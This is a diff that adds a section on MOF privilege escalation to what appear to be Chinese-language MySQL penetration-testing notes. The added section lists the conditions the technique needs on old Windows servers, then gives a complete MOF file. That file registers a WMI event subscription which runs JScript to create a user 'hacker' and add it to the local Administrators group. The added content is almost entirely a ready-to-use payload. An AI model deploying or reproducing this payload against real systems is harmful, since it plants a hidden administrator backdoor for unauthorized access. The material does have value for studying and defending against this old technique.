@@ -1432,4 +1432,44 @@ Bye
 
 # 2. 遗留
 还差MOF提权，日志提权2个总结出来
+<details>
+<summary>1. MOF提权</summary>
+  
+```c
+// MOF条件比较苛刻：
+//+ 1. windows 03及以下版本
+//+ 2. mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录
+//+ 3. secure-file-priv参数不为null
+
+#pragma namespace("\\\\.\\root\\subscription") 
+ 
+instance of __EventFilter as $EventFilter 
+{ 
+    EventNamespace = "Root\\Cimv2"; 
+    Name  = "filtP2"; 
+    Query = "Select * From __InstanceModificationEvent " 
+            "Where TargetInstance Isa \"Win32_LocalTime\" " 
+            "And TargetInstance.Second = 5"; 
+    QueryLanguage = "WQL"; 
+}; 
+ 
+instance of ActiveScriptEventConsumer as $Consumer 
+{ 
+    Name = "consPCSV2"; 
+    ScriptingEngine = "JScript"; 
+    ScriptText = 
+"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
+}; 
+ 
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = $Consumer; 
+    Filter = $EventFilter; 
+};
+```
+
+</details>
+
+
+
 # 3. 说明
